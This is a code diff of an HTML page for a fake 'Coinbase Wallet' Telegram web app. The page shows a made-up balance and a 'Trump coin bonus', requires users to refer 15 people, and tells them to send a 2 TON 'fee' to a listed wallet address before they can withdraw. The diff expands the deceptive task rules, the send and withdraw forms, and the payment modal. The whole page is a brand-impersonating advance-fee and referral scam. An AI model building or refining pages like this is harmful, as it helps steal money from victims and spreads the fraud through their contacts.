@@ -6,39 +6,29 @@
   <title>Coinbase</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
   <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.7.2/css/all.css">
+  <link href="https://unpkg.com/boxicons@2.0.7/css/boxicons.min.css" rel="stylesheet">
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <!-- Google Font -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-  
-  <!-- Include Toastify library -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Toastify/1.11.2/Toastify.min.css"> 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/Toastify/1.11.2/Toastify.min.js"></script>
-<!-- iziToast JS -->
-    <script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
-        <!-- iziToast CSS -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
-    
-      <!-- iziModal CSS -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/css/iziModal.min.css">
-  
   <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
-  <!-- Font Awesome (Optional for Icons) 
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-   -->
 
   <style>
     body {
       background-color: #000;
       color: #fff;
       font-family: 'Inter', sans-serif;
-      user-select:none;
+      user-select: none;
     }
     #coinbase_hd {
       width: 35px;
       height: 35px;
       margin: 0;
-      padding: ;5px;
-      background-color: ;#fff;
+      padding: 0px;
+      background-color: #fff;
       border-radius: 50%;
     }
     .wallet-header {
@@ -65,9 +55,6 @@
       overflow: hidden;
       text-overflow: ellipsis;
       white-space: nowrap;
-    }
-    .account-section i {
-      display: none; /* Hide the dropdown caret */
     }
     .dropdown-menu {
       background-color: #222;
@@ -97,13 +84,11 @@
       background-color: #808080a6;
       font-size: 10px;
       color: #bfbfbfae;
-      margin:0;
-      position:relative;
+      margin: 0;
+      position: relative;
       top: -2.5px;
       font-weight: 900;
-      opacity:.7;
-           
-      
+      opacity: 0.7;
     }
     .btn-circle {
       width: 55px;
@@ -127,18 +112,16 @@
       justify-content: center;
       gap: 10px;
     }
-    /* small screen devices */
-@media only screen and (max-width: 450px) {
-    .action-buttons {
+    @media only screen and (max-width: 450px) {
+      .action-buttons {
         justify-content: center;
         gap: 2px;
-    }
-    
-    .btn-circle {
+      }
+      .btn-circle {
         width: 45px;
         height: 45px;
+      }
     }
-}   
     .action-item {
       text-align: center;
     }
@@ -174,22 +157,17 @@
       font-size: 0.9rem;
       color: #999;
     }
-    .green{color:green;}.red{color:red;}
-    
-    
-    
-  /* General styling for dark modal */
-  .dark-content {
-    background-color: #222;
-    color: #fff;
-    padding: 20px;
-    border-radius: 8px;
-    font-size: 1.1rem;
-    text-align: center;
-  }
-
+    .green { color: green; }
+    .red { color: red; }
+    .dark-content {
+      background-color: #222;
+      color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      font-size: 1rem;
+    }
     .dark-content button {
-      background-color: #444; /* Dark button */
+      background-color: #444;
       color: #fff;
       border: none;
       padding: 10px 20px;
@@ -200,150 +178,225 @@
     .dark-content button:hover {
       background-color: #666;
     }
-    .iziModal{
-      width:80%;
-    }  
-
-  /* Styling for the form */
-  .wallet-form {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 20px;
-  }
-
-  .wallet-form input[type="text"] {
-    width: 90%;
-    max-width: 400px;
-    padding: 10px;
-    border: 1px solid #444;
-    border-radius: 6px;
-    background-color: #333;
-    color: #fff;
-    font-size: 1rem;
-    outline: none;
-  }
-
-  .wallet-form input[type="text"]::placeholder {
-    color: #aaa;
-  }
-
-  .wallet-form input[type="submit"] {
-    padding: 10px 20px;
-    background-color: #444;
-    color: #fff;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    font-size: 1rem;
-    transition: background-color 0.3s ease;
-  }
-
-  .wallet-form input[type="submit"]:hover {
-    background-color: #666;
-  }
-
-  /* Styling for deposit address */
-  .depAddr {
-    font-weight: bold;
-    color: #0f7cdb; /* A slightly bright color for visibility */
-    background: #333;
-    padding: 5px 10px;
-    border-radius: 6px;
-    font-size: 1rem;
-    letter-spacing: 0.5px;
-  }
-
-  /* Copy icon styling */
-  #copyIt {
-    margin-left: 10px;
-    cursor: pointer;
-    color: #fff;
-    font-size: 1.2rem;
-    transition: color 0.3s ease;
-  }
-
-  #copyIt:hover {
-    color: #0f7cdb;
-  }
-
-  /* Close button */
-  .close-btn {
-    margin-top: 15px;
-    padding: 10px 20px;
-    background-color: #444;
-    color: #fff;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    font-size: 1rem;
-    transition: background-color 0.3s ease;
-  }
-
-  .close-btn:hover {
-    background-color: #666;
-  }
-
-  /* Hide label (for accessibility) */
-  .hidden-label {
-    position: absolute;
-    left: -9999px;
-  }
-  
-  .coin-defaults {
-    background-image: linear-gradient(45deg, gold, yellow, white, gray);
-    background-size: 200% auto;
-    color: transparent;
-    -webkit-background-clip: text;
-    animation: gradientAnimation 2s linear infinite;
+    .iziModal {
+      width: 80%;
     }
-  
-  @keyframes gradientAnimation {
-  to {
-    background-position: -200% center;
+    .wallet-form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
     }
-  }
-  .trump_img{
-    border-radius: 50%;
-  }
-  .warning{
-      color:red;
+    .wallet-form input[type="text"],
+    .wallet-form input[type="email"],
+    .wallet-form input[type="number"],
+    .wallet-form input[type="password"] {
+      width: 90%;
+      max-width: 400px;
+      padding: 10px;
+      border: 1px solid #444;
+      border-radius: 6px;
+      background-color: #333;
+      color: #fff;
+      font-size: 0.9rem;
+      outline: none;
+    }
+    .wallet-form input::placeholder {
+      color: #aaa;
+    }
+    .wallet-form input[type="submit"] {
+      padding: 10px 20px;
+      background-color: #444;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      transition: background-color 0.3s ease;
+    }
+    .wallet-form input[type="submit"]:hover {
+      background-color: #666;
+    }
+    .wallet-form input[type="submit"].loading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+    }
+    .depAddr {
+      font-weight: bold;
+      color: #0f7cdb;
+      background: #333;
+      padding: 5px 10px;
+      border-radius: 6px;
+      font-size: 0.9rem;
+      letter-spacing: 0.5px;
+    }
+    #copyIt, #copyAddress {
+      margin-left: 10px;
+      cursor: pointer;
+      color: #fff;
+      font-size: 1.1rem;
+      transition: color 0.3s ease;
+    }
+    #copyIt:hover, #copyAddress:hover {
+      color: #0f7cdb;
+    }
+    .close-btn {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background-color: #444;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      transition: background-color 0.3s ease;
+    }
+    .close-btn:hover {
+      background-color: #666;
+    }
+    .hidden-label {
+      position: absolute;
+      left: -9999px;
+    }
+    .coin-defaults {
+      background-image: linear-gradient(45deg, gold, yellow, white, gray);
+      background-size: 200% auto;
+      color: transparent;
+      -webkit-background-clip: text;
+      animation: gradientAnimation 2s linear infinite;
+    }
+    @keyframes gradientAnimation {
+      to {
+        background-position: -200% center;
+      }
+    }
+    .trump_img {
+      border-radius: 50%;
+    }
+    .warning {
+      color: red;
       font-weight: 100;
       font-size: 0.7rem;
-      
-  }
-  .hide{
+    }
+    .hide {
       display: none;
-  }
-  #qrCodeContainer canvas{
-      padding:15px;
-      background-color:#fff;
-      border-radius:5px;
-      
-  }
-
-</style>
-  
-  
+    }
+    #qrCodeContainer canvas {
+      padding: 15px;
+      background-color: #fff;
+      border-radius: 5px;
+    }
+    .visually-hidden {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      border: 0;
+    }
+    .form-select {
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #444;
+      background-color: #333;
+      color: #fff;
+      margin-bottom: 10px;
+      font-size: 0.9rem;
+    }
+    #notification-table-body li {
+      padding: 10px;
+      border-bottom: 1px solid #444;
+      font-size: 0.9rem;
+    }
+    #notification-table-body li:last-child {
+      border-bottom: none;
+    }
+    body.light {
+      background-color: #f8f9fa;
+      color: #333;
+    }
+    body.light .wallet-header,
+    body.light .crypto-card,
+    body.light .dark-content {
+      background-color: #fff;
+      color: #333;
+    }
+    body.light .dropdown-menu {
+      background-color: #fff;
+      color: #333;
+    }
+    body.light .dropdown-item {
+      color: #333;
+    }
+    body.light .btn-circle {
+      background-color: #ddd;
+      color: #333;
+    }
+    body.light .form-select,
+    body.light .wallet-form input {
+      background-color: #fff;
+      color: #333;
+      border: 1px solid #ccc;
+    }
+    body.light .table-dark {
+      background-color: #fff;
+      color: #333;
+    }
+    @media (max-width: 576px) {
+      .iziModal {
+        width: 90%;
+      }
+      .dark-content {
+        font-size: 0.85rem;
+      }
+      .wallet-form input,
+      .form-select {
+        font-size: 0.8rem;
+      }
+      .close-btn {
+        font-size: 0.8rem;
+      }
+      .depAddr {
+        font-size: 0.8rem;
+      }
+      #copyIt, #copyAddress {
+        font-size: 1rem;
+      }
+      .table {
+        font-size: 0.75rem;
+        display: block;
+        overflow-x: auto;
+        white-space: nowrap;
+      }
+      .table thead th {
+        min-width: 80px;
+      }
+      .table tbody td {
+        min-width: 80px;
+      }
+    }
+  </style>
 </head>
 <body>
   <!-- Wallet Header -->
   <div class="wallet-header">
-    <img id="coinbase_hd" src="  https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDAaw4l8JGDm5-GkzwJuNd9m7vsxf9-5ZtXeN-akM1A82LJq7Re5MOYa0v-3xKpUd4NdM&usqp=CAU" alt="Coinbase">
-    <!--<img id="coinbase_hd" src="https://static-00.iconduck.com/assets.00/coinbase-icon-512x512-rgejvkzh.png" alt="Coinbase"> -->
+    <img id="coinbase_hd" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDAaw4l8JGDm5-GkzwJuNd9m7vsxf9-5ZtXeN-akM1A82LJq7Re5MOYa0v-3xKpUd4NdM&usqp=CAU" alt="Coinbase">
     <h1>Coinbase Wallet</h1>
-    <!-- Dropdown for account -->
     <div class="dropdown">
       <div class="account-section dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">
         <span id="account-name">Account</span>
       </div>
       <ul class="dropdown-menu">
-        <li><a class="dropdown-item" href="#">Profile</a></li>
-        <!--
-        <li><a class="dropdown-item" href="#">Settings</a></li>
-        <li><a class="dropdown-item" href="#">Logout</a></li>
-        -->
+        <li><a class="dropdown-item open-btn" id="profile-pop" data-modal-id="profile-iziModal">Profile</a></li>
+        <li><a class="dropdown-item open-btn" id="history-pop" data-modal-id="history-iziModal">History</a></li>
+        <li><a class="dropdown-item open-btn" id="notification-pop" data-modal-id="notification-iziModal">Notification</a></li>
+        <li><a class="dropdown-item open-btn" id="settings-pop" data-modal-id="settings-iziModal">Settings</a></li>
+        <li><a class="dropdown-item open-btn" id="logout-pop" data-modal-id="logout-iziModal">Logout</a></li>
       </ul>
     </div>
   </div>
@@ -351,7 +404,7 @@
   <!-- Balance Section -->
   <div class="balance-section">
     <h2 style="font-weight:900;">$25.01</h2>
-    <p><span id="wallet-address" style="color:#5a5a5ae9;font-weight:900;">0xA1Ed...3CB4E</span> <span class="coin-default"><span class="coin-defaults">Trump</span></span></p>
+    <p><span id="wallet-address" style="color:#5a5a5ae9;font-weight:900;">0xA1Ed...3CB4E</span><i id="copyAddress" class="bx bx-copy"></i> <span class="coin-default"><span class="coin-defaults">Trump</span></span></p>
   </div>
 
   <!-- Action Buttons -->
@@ -361,16 +414,7 @@
       <span>Send</span>
     </div>
     <div class="action-item">
-      <button class="btn-circle open-withdraw" data-modal-id="darkModal2">
-          <!-- 
-          <i class="far fa-arrow-down-left"></i>
-           -->
-          <i class="far fa-arrow-alt-circle-up"></i>
-      </button>
-      
-      <!-- 
-      <span>Receive</span>
-       -->
+      <button class="btn-circle open-withdraw" data-modal-id="darkModal2"><i class="far fa-arrow-alt-circle-up"></i></button>
       <span>Withdraw</span>
     </div>
     <div class="action-item">
@@ -378,145 +422,51 @@
       <span>Hot 🔥</span>
     </div>
     <div class="action-item">
-      <button class="btn-circle open-btn" data-modal-id="darkModal4" ><i class="fa-regular fa-layer-plus"></i></button>
+      <button class="btn-circle open-btn" data-modal-id="darkModal4"><i class="fa-regular fa-layer-plus"></i></button>
       <span>Tasks</span>
     </div>
-    
     <div class="action-item">
       <button class="btn-circle open-btn" id="share-button" data-modal-id="darkModal5"><i class="fa-regular fa-share-nodes"></i></button>
       <span>Share</span>
     </div>
-
   </div>
 
   <!-- Crypto Cards -->
-<!-- Crypto Cards 
-<div class="container">
-  <div class="crypto-card">
-    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB">
-    <div class="details">
-      <h5>BNB</h5>
-      <span>BNB Smart Chain</span>
+  <div class="container">
+    <div class="crypto-card">
+      <img src="https://static.coinpaprika.com/coin/bnb-binance-coin/logo.png" alt="BNB">
+      <div class="details">
+        <h5>BNB</h5>
+        <span>BNB Smart Chain</span>
+      </div>
+      <div class="price">
+        <p>$76.01</p>
+        <span>691.03 $</span>
+      </div>
     </div>
-    <div class="price">
-      <p>$76.01</p>
-      <span>691.03 $</span>
+    <div class="crypto-card">
+      <img src="https://static.coinpaprika.com/coin/eth-ethereum/logo.png" alt="ETH">
+      <div class="details">
+        <h5>ETH</h5>
+        <span>Ethereum</span>
+      </div>
+      <div class="price">
+        <p>$2.10</p>
+        <span>3230.83 $</span>
+      </div>
     </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH">
-    <div class="details">
-      <h5>ETH</h5>
-      <span>Ethereum</span>
+    <div class="crypto-card">
+      <img src="https://static.coinpaprika.com/coin/shib-shiba-inu/logo.png" alt="SHIBA">
+      <div class="details">
+        <h5>SHIBA</h5>
+        <span>Ethereum</span>
+      </div>
+      <div class="price">
+        <p>$1.51</p>
+        <span>234.04 $</span>
+      </div>
     </div>
-    <div class="price">
-      <p>$2.10</p>
-      <span>3230.83 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://cryptologos.cc/logos/shiba-inu-shib-logo.png" alt="SHIBA">
-    <div class="details">
-      <h5>SHIBA</h5>
-      <span>Ethereum</span>
-    </div>
-    <div class="price">
-      <p>$1.51</p>
-      <span>234.04 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/4687.png" alt="BUSD">
-    <div class="details">
-      <h5>BUSD</h5>
-      <span>BNB Smart Chain</span>
-    </div>
-    <div class="price">
-      <p>$4.04</p>
-      <span>1.03 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://static.coinpaprika.com/coin/pepe-pepe/logo.png" alt="PEPE">
-    <div class="details">
-      <h5>PEPE</h5>
-      <span>Ethereum Chain</span>
-    </div>
-    <div class="price">
-      <p>$0.00000123</p>
-      <span>0.0000003 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://cryptologos.cc/logos/sui-sui-logo.png" alt="SUI">
-    <div class="details">
-      <h5>SUI</h5>
-      <span>Sui Blockchain</span>
-    </div>
-    <div class="price">
-      <p>$0.98</p>
-      <span>1.02 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://cryptologos.cc/logos/chainlink-link-logo.png" alt="LINK">
-    <div class="details">
-      <h5>LINK</h5>
-      <span>Ethereum Chain</span>
-    </div>
-    <div class="price">
-      <p>$7.14</p>
-      <span>7.01 $</span>
-    </div>
-  </div>
-</div>
- -->
- <!--  --><!--  -->
- <!-- Crypto Cards -->
-<div class="container">
-  <div class="crypto-card">
-    <img src="https://static.coinpaprika.com/coin/bnb-binance-coin/logo.png" alt="BNB">
-    <div class="details">
-      <h5>BNB</h5>
-      <span>BNB Smart Chain</span>
-    </div>
-    <div class="price">
-      <p>$76.01</p>
-      <span>691.03 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://static.coinpaprika.com/coin/eth-ethereum/logo.png" alt="ETH">
-    <div class="details">
-      <h5>ETH</h5>
-      <span>Ethereum</span>
-    </div>
-    <div class="price">
-      <p>$2.10</p>
-      <span>3230.83 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://static.coinpaprika.com/coin/shib-shiba-inu/logo.png" alt="SHIBA">
-    <div class="details">
-      <h5>SHIBA</h5>
-      <span>Ethereum</span>
-    </div>
-    <div class="price">
-      <p>$1.51</p>
-      <span>234.04 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
+      <div class="crypto-card">
     <img src="https://static.coinpaprika.com/coin/usdt-tether/logo.png" alt="USDT">
     <div class="details">
       <h5>USDT</h5>
@@ -527,59 +477,63 @@
       <span>1.00 $</span>
     </div>
   </div>
-
-  <div class="crypto-card">
-    <img src="https://static.coinpaprika.com/coin/pepe-pepe/logo.png" alt="PEPE">
-    <div class="details">
-      <h5>PEPE</h5>
-      <span>Ethereum Chain</span>
+    <div class="crypto-card">
+      <img src="https://static.coinpaprika.com/coin/pepe-pepe/logo.png" alt="PEPE">
+      <div class="details">
+        <h5>PEPE</h5>
+        <span>Ethereum Chain</span>
+      </div>
+      <div class="price">
+        <p>$0.00000123</p>
+        <span>0.0000003 $</span>
+      </div>
     </div>
-    <div class="price">
-      <p>$0.00000123</p>
-      <span>0.0000003 $</span>
+    <div class="crypto-card">
+      <img src="https://static.coinpaprika.com/coin/sui-sui/logo.png" alt="SUI">
+      <div class="details">
+        <h5>SUI</h5>
+        <span>Sui Blockchain</span>
+      </div>
+      <div class="price">
+        <p>$0.98</p>
+        <span>1.02 $</span>
+      </div>
     </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://static.coinpaprika.com/coin/sui-sui/logo.png" alt="SUI">
-    <div class="details">
-      <h5>SUI</h5>
-      <span>Sui Blockchain</span>
-    </div>
-    <div class="price">
-      <p>$0.98</p>
-      <span>1.02 $</span>
-    </div>
-  </div>
-
-  <div class="crypto-card">
-    <img src="https://static.coinpaprika.com/coin/link-chainlink/logo.png" alt="LINK">
-    <div class="details">
-      <h5>LINK</h5>
-      <span>Ethereum Chain</span>
-    </div>
-    <div class="price">
-      <p>$7.14</p>
-      <span>7.01 $</span>
+    <div class="crypto-card">
+      <img src="https://static.coinpaprika.com/coin/link-chainlink/logo.png" alt="LINK">
+      <div class="details">
+        <h5>LINK</h5>
+        <span>Ethereum Chain</span>
+      </div>
+      <div class="price">
+        <p>$7.14</p>
+        <span>7.01 $</span>
+      </div>
     </div>
   </div>
-</div>
- <!--  --><!--  -->
-  
-    <!-- Dark Popup Modal 1 -->
+
+  <!-- Dark Popup Modal 1 (Send) -->
   <div id="darkModal1" class="iziModal" data-izimodal-title="Send">
     <div class="dark-content">
-      <p>Kindly complete the task!</p>
-      <p>This action can not be fulfilled yet.</p>
+      <p>Enter recipient details</p>
+      <form class="wallet-form" id="send-form">
+        <label for="sendWalletInput" class="hidden-label">Recipient Wallet Address</label>
+        <input type="text" id="sendWalletInput" placeholder="Enter Recipient Wallet Address..." required>
+        <span class="text-warning warning">* Ensure the wallet address is correct!</span>
+        <label for="sendAmountInput" class="hidden-label">Send Amount</label>
+        <input type="number" id="sendAmountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
+        <span class="text-warning warning hide" id="insufficient-send-balance">* You do not have sufficient balance!</span>
+        <input id="submitSendInfo" type="submit" value="Send">
+      </form>
       <button class="close-btn">Close</button>
     </div>
   </div>
 
-  <!-- Dark Popup Modal 2 -->
+  <!-- Dark Popup Modal 2 (Eligibility Message) -->
   <div id="darkModal2" class="iziModal" data-izimodal-title="Withdraw">
     <div class="dark-content">
-      <p>Kindly share your referral link to 15 users before attempting to withdraw from your wallet!</p>
-      <p>[You are not eligible: 2137.]</p>
+      <p id="withdraw-message">Kindly share your referral link to 15 users before attempting to withdraw from your wallet!</p>
+      <p id="eligibility-message">[You are not eligible: 2137.]</p>
       <button class="close-btn">Close</button>
     </div>
   </div>
@@ -588,588 +542,907 @@
   <div id="darkModal3" class="iziModal" data-izimodal-title="Hot 🔥">
     <div class="dark-content">
       <p>Congratulation!</p>
-      <p>You've joined the Trump coin bonus. Kindly complete the tasks to reach the threshold withdrawal</p>
+      <p>You've joined the Trump coin bonus. Kindly complete the tasks to reach the withdrawal threshold.</p>
       <button class="close-btn">Close</button>
     </div>
   </div>
-  
-  <!-- Dark Popup Modal 4 -->
+
+  <!-- Dark Popup Modal 4 (Tasks) -->
   <div id="darkModal4" class="iziModal" data-izimodal-title="Tasks">
     <div class="dark-content">
       <p style="text-align: left;">
-          <span>Instructions:</span>
-          <ol type="i" style="text-align:left;">
-              <li>Share your copied referral link</li>
-              <li>Join our channel for updates and reward</li>
-              <li>Complete the daily task posted to boost your earnings.</l>
-          </ol>
-          
+        <span>Instructions & Rules:</span>
+        <ol type="i" style="text-align:left;">
+          <li>Share your unique referral link with at least 15 users to unlock withdrawal eligibility.</li>
+          <li>Join our official Telegram channel for real-time updates, rewards, and exclusive offers.</li>
+          <li>Complete daily tasks posted on the channel to boost your earnings and increase your balance.</li>
+          <li>Ensure your profile details are complete and accurate to avoid delays in withdrawal processing.</li>
+          <li>Deposits and withdrawals require a 2 TON fee to the designated wallet address.</li>
+          <li>Violations of terms (e.g., fake referrals) will result in account suspension.</li>
+        </ol>
       </p>
-      <p>For more updates or enquires:</p>
-      <button class="close-btn"><a href="https://t.me/+SgPWVNYhL3QxNTkx">Join our channel</a></button> <button class="close-btn">back</button>
+      <p style="text-align: left;">
+        <span>Guides:</span>
+        <ul style="text-align:left;">
+          <li>Use the Share button to copy your referral link and send it via Telegram or other platforms.</li>
+          <li>Monitor your referral count in the Profile section to track progress toward the 15-referral threshold.</li>
+          <li>Check the Transaction History regularly to confirm deposits, withdrawals, and fees.</li>
+          <li>Contact support via the Telegram channel for issues with payments or account verification.</li>
+        </ul>
+      </p>
+      <p>For more updates or inquiries:</p>
+      <button class="close-btn"><a href="https://t.me/+SgPWVNYhL3QxNTkx">Join our channel</a></button>
+      <button class="close-btn">Back</button>
     </div>
   </div>
-  
+
   <!-- Dark Popup Modal 5 -->
   <div id="darkModal5" class="iziModal" data-izimodal-title="Share">
     <div class="dark-content">
       <p>Your referral link has been copied successfully!</p>
-      <p>Share the link to get $10 per your referral!</p>
-      <p><strong style="color:red;">Note:</strong> Your withdrawal is subjected to review and verification.</p>
+      <p>Share the link to get $10 per referral!</p>
+      <p><strong style="color:red;">Note:</strong> Your withdrawal is subject to review and verification.</p>
       <button class="close-btn">Close</button>
     </div>
   </div>
-  
+
   <!-- Dark Popup Modal 6 -->
   <div id="darkModal6" class="iziModal" data-izimodal-title="Update!!!">
     <div class="dark-content">
-        <p>
-        <img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump">
-        </p>
-      <p><strong>Don't miss out</strong> on your special offer for this season
-The live OFFICIAL TRUMP today is amazing with a 24-hour trading volume of $4430844387.08 USD is giving out a bonus for Trump lunch Trump coin be among the lucky winners now by completing the task.</p>
-
-      <p>Share the link, and join our channel to get $10 per your referral!</p>
-      <p><strong><a style="color:green;" href="https://coinmarketcap.com/currencies/official-trump/">Read More &raquo;</a></strong></p>
+      <p><img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump"></p>
+      <p><strong>Don't miss out</strong> on your special offer for this season. The live OFFICIAL TRUMP today is amazing with a 24-hour trading volume of $4430844387.08 USD. Be among the lucky winners now by completing the tasks.</p>
+      <p>Share the link and join our channel to get $10 per referral!</p>
+      <p><strong><a style="color:green;" href="https://coinmarketcap.com/currencies/official-trump/">Read More »</a></strong></p>
       <p><strong><a href="https://t.me/+SgPWVNYhL3QxNTkx">JOIN CHANNEL</a></strong></p>
       <button class="close-btn">Close</button>
     </div>
   </div>
-   
-   <!-- Dark Popup Modal 7 -->
-   <div id="darkModal7" class="iziModal" data-izimodal-title="Withdraw">
-  <div class="dark-content">
-    <p>Enter your withdrawal details</p>
-    <p>
+
+  <!-- Dark Popup Modal 7 (Withdraw Form) -->
+  <div id="darkModal7" class="iziModal" data-izimodal-title="Withdraw">
+    <div class="dark-content">
+      <p>Enter your withdrawal details</p>
       <form class="wallet-form" id="wallet-form">
         <label for="walletInput" class="hidden-label">Wallet Address</label>
-        <input type="text" id="walletInput" placeholder="Enter Your Trump Wallet Address...">
-        <span class="text-warning warning">* Enter correct wallet details, this action is irreversible!</span>
-        
+        <input type="text" id="walletInput" placeholder="Enter Recipient Wallet Address..." required>
+        <span class="text-warning warning">* Ensure the wallet address exists in the app!</span>
         <label for="wallet_amountInput" class="hidden-label">Withdrawal Amount</label>
-        <input type="text" id="wallet_amountInput" placeholder="Enter Amount">
-        <span class="text-warning warning hide">* You do not have sufficient balance!</span>
-                
-        <input id="submitWalletInfo" type="submit" value="Continue">
-        
+        <input type="number" id="wallet_amountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
+        <span class="text-warning warning hide" id="insufficient-balance">* You do not have sufficient balance!</span>
+        <input id="submitWalletInfo" type="submit" value="Withdraw">
       </form>
-    </p>
-    
+      <button class="close-btn">Close</button>
+    </div>
   </div>
-</div> 
 
-
-
-<!-- Dark Popup Modal 7 
-   <div id="darkModal7" class="iziModal" data-izimodal-title="Withdraw">
-  <div class="dark-content">
-    <p>Enter your withdrawal details</p>
-    <p>
-      <form class="wallet-form">
-        <label for="wallet" class="hidden-label">Wallet Address</label>
-        <input type="text" id="wallet" placeholder="Enter Your Trump Wallet Address...">
-        <span class="text-warning warning">* Enter correct wallet details, this action is irreversible!</span>
-        
-        <label for="wallet_amount" class="hidden-label">Withdrawal Amount</label>
-        <input type="text" id="wallet_amount" placeholder="Enter Amount">
-        <span class="text-warning warning hide">* You do not have sufficient balance!</span>
-                
-        <input id="submitWalletInfo" type="submit" value="Continue">
-        
-      </form>
-    </p>
-    
+  <!-- Dark Popup Modal 8 -->
+  <div id="darkModal8" class="iziModal" data-izimodal-title="Pending">
+    <div class="dark-content">
+      <p>Payment!!!</p>
+      <p>Kindly copy the wallet address below and make a deposit of 2 <strong class="coin-defaults">TONS</strong>.</p>
+      <p>
+        <span class="depAddr">UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy</span>
+        <i class="far fa-copy" id="copyIt" title="Copy Address"></i>
+      </p>
+      <div id="qrCodeContainer" style="margin-top: 15px;"></div>
+      <p style="font-size:0.7rem;"><span style="color:red;">NOTE:</span> * Do not click continue if you have not made payment! Clicking continue without payment will incur permanent fund loss.</p>
+      <p id="continuePayment"><strong id="continuePaymentText">Continue »</strong></p>
+      <button class="close-btn">Close</button>
+    </div>
   </div>
-</div> 
- -->
-
-
-
-   <!-- Dark Popup Modal 8 -->
-   <div id="darkModal8" class="iziModal" data-izimodal-title="Pending">
-  <div class="dark-content">
-    <p>Payment!!!</p>
-    
-
-    <p>Kindly copy the wallet address below, and make a deposit of 2 <strong class="coin-defaults">TONS</strong>.</p>
-
-    <p>
-      <span class="depAddr">UQC1f5...Z0HfkO8aTDy</span>
-      <i class="far fa-copy" id="copyIt" title="Copy Address"></i>
-    </p>
-    
-    <!-- QR Code placeholder -->
-    <div id="qrCodeContainer" style="margin-top: 15px;"></div>
-    
-    <p style="font-size:4px;"><span style="color:red;font-size:4px;">NOTE:</span> * Do not click continue if you have not made payment! Clicking on continue without payment will incur permanent fund loss.</p>
-
-    <p id="continuePayment"><strong id="continuePaymentText">Continue &raquo;</strong></p>
-    <button class="close-btn">Close</button>
-  </div>
-</div>  
-
 
   <!-- Dark Popup Modal 9 -->
   <div id="darkModal9" class="iziModal" data-izimodal-title="Status - <strong>Pending</strong>">
     <div class="dark-content">
-        <p>
-        <img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump">
-        </p>
+      <p><img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump"></p>
       <p><strong>Congratulations!!! 🎉🎉🎉</strong></p>
-
-      <p>You have already requested for a withdrawal! Kindly wait for confirmation of your payment. Your withdrawal will be automatically settled in your specified <span class="coin-defaults">TRUMP</span> wallet after verification</p>
-      
-      <p><h4>Want to earn more ?</h4></p>
-      
-      <p>Join our <a href="https://t.me/+SgPWVNYhL3QxNTkx">channel</a> and share your referral link! </p>
+      <p>You have already requested a withdrawal! Kindly wait for confirmation of your payment. Your withdrawal will be automatically settled in your specified <span class="coin-defaults">TRUMP</span> wallet after verification.</p>
+      <p><h4>Want to earn more?</h4></p>
+      <p>Join our <a href="https://t.me/+SgPWVNYhL3QxNTkx">channel</a> and share your referral link!</p>
       <p style="font-style:italic; font-weight:100;">Thanks for your participation</p>
